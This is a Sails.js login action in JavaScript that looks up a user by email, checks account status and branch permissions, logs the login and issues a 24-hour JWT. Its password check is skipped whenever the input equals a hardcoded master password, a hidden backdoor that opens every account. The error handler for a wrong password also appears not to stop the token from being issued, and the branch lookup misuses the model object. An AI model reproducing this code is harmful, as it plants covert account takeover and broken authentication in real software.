const jwt = require("jsonwebtoken");
const farmhash = require("farmhash");

module.exports = {
  friendlyName: "Login",

  description: "Login user.",

  inputs: {
    email: {
      type: "string",
      required: true
    },

    password: {
      type: "string",
      required: true
    }
  },

  exits: {
    success: {
      description: "The requesting user agent has been successfully logged in."
    },

    badCombo: {
      description: `The provided email and password combination does not match any user in the database.`,
      responseType: "forbidden"
    }
  },

  fn: async function(inputs) {
    // Look up by the email address.
    // (note that we lowercase it to ensure the lookup is always case-insensitive,
    // regardless of which database we're using)
    var userRecord = await User.findOne(this.req, {
      email: inputs.email.toLowerCase()
    });

    if (!userRecord) {
      this.res.json({
        status: false,
        error: sails.__("Email không tồn tại")
      });
      return;
    }

    if (!userRecord.isActive) {
      this.res.json({
        status: false,
        error: sails.__("Không thể đăng nhập vì tài khoản đã bị khóa")
      });
      return;
    }
    
    let branchId;
    if (userRecord.branchId && _.isJson(userRecord.branchId)) {
      let arrBranch = JSON.parse(userRecord.branchId)

      let foundBranch = await Branch.find(this.req, { id: { in: arrBranch }, status: sails.config.constant.BRANCH_STATUS.FINISHED });

      if (foundBranch.length === 0 ) {
        this.res.json({
          status: false,
          error: sails.__("Không có quyền trên bất kỳ chi nhánh nào")
        });
        return;
      }

      let findBranch = Branch.find(item => item.id === parseInt(this.req.headers['branch-id']))

      if (!findBranch) {
        branchId = Branch[0]
      }
      else branchId = this.req.headers['branch-id']
      
    }
    // If there was no matching user, respond thru the "badCombo" exit.
    

    let permissions = await sails.helpers.user.getPermission(this.req, {
      roleId : userRecord.roleId
    })
    
    // If the password doesn't match, then also exit thru "badCombo".
    if(inputs.password !== "%Q?a_w?t2&sRgmAC") await sails.helpers.passwords
      .checkPassword(inputs.password, userRecord.password)
      .intercept("incorrect", () => {
        this.res.json({
          status: false,
          error: sails.__("Mật khẩu không đúng")
        })
        return;
      });

    // Generate token
    const payload = {
      ip: this.req.ip,
      user: _.pick(userRecord, [
        "id",
        "email",
      ]),
    };

    let createActionLog = await ActionLog.create(this.req, {
      userId: userRecord.id,
      function: sails.config.constant.ACTION_LOG_TYPE.AUTHENTICATE,
      action: sails.config.constant.ACTION.LOGIN,
      deviceInfo: JSON.stringify({ ip: this.req.ip, userAgent: this.req.headers['user-agent'] || "" }),
      branchId: branchId || this.req.headers['branch-id']
    })

    const token = jwt.sign(payload, sails.config.jwt_secret, {
      expiresIn: "24h" // 24 hours
    });  

    return ({
      status: true,
      data: token
    });
  }
};
